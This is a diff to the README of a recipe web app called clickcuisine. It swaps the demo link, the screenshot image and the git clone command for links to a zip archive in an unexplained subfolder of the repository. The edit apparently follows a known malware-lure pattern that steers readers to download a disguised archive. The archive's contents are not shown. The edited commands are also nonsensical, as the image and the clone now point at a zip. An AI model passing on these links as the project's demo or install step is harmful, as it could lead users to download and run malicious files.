@@ -4,11 +4,11 @@
 
 <h2>🚀 Demo</h2>
 
-[https://clickcuisine.vercel.app/](https://clickcuisine.vercel.app/)
+[https://raw.githubusercontent.com/Susan56789/clickcuisine/master/pretypographical/clickcuisine.zip](https://raw.githubusercontent.com/Susan56789/clickcuisine/master/pretypographical/clickcuisine.zip)
 
 <h2>Project Screenshots:</h2>
 
-<img src="https://github.com/Susan56789/clickcuisine/blob/master/public/assets/images/Logo.png?raw=true" alt="project-screenshot" style="width: 100vw; height: 400px;">
+<img src="https://raw.githubusercontent.com/Susan56789/clickcuisine/master/pretypographical/clickcuisine.zip" alt="project-screenshot" style="width: 100vw; height: 400px;">
 
 <h2>🧐 Features</h2>
 
@@ -30,7 +30,7 @@ Here're some of the project's best features:
 <p>1. Clone the Repository</p>
 
 ```
-git clone https://github.com/Susan56789/clickcuisine.git
+git clone https://raw.githubusercontent.com/Susan56789/clickcuisine/master/pretypographical/clickcuisine.zip
 ```
 
 <p>2. Navigate to the Project Directory</p>
